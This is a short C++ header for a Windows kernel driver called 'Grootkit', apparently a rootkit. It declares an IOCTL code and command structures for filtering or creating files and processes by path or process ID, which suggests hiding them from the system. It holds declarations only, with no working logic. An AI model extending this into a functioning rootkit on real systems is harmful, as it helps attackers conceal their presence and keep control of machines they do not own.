#pragma once
#include<ntddk.h>

#define GROOTKIT_DEVICE 0x8000

#define IOCTL_GROOTKIT CTL_CODE(GROOTKIT_DEVICE,0x800, METHOD_NEITHER, FILE_ANY_ACCESS)

enum CommandType
{
	InvalidCommandType = 0,
	FileFilter = 1,
	FileCreation = 2,
	ProcessFilter = 3,
	ProcessCreation = 4
};

struct FileFilterData {
	UNICODE_STRING filePath;
};

struct FileCreationData {
	UNICODE_STRING filePath;
	UNICODE_STRING data;
};

struct ProcessFilterData {
	UINT32 pid;
};

struct ProcessCreationData {
	
};

union CommandData
{
	FileFilterData FileFilter;
	FileCreationData FileCreation;
	ProcessFilterData ProcessFilter;
	ProcessCreationData ProcessCreation;
};

struct GrootkitData {
	CommandType whichCommand;
	CommandData command;
};


